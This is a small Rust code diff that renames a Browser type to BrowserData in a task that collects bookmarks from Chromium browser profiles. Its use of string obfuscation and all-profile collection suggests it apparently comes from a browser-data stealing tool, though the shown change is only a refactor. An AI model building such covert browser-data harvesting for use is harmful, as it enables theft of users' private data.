@@ -5,16 +5,16 @@ use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::Path;
 use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
-use crate::chromium::Browser;
+use crate::chromium::BrowserData;
 use obfstr::obfstr as s;
 use json::{parse, Value};
 
 pub(super) struct BookmarksTask {
-    browser: Arc<Browser>
+    browser: Arc<BrowserData>
 }
 
 impl BookmarksTask {
-    pub(super) fn new(browser: Arc<Browser>) -> Self {
+    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
         Self { browser }
     }
 }
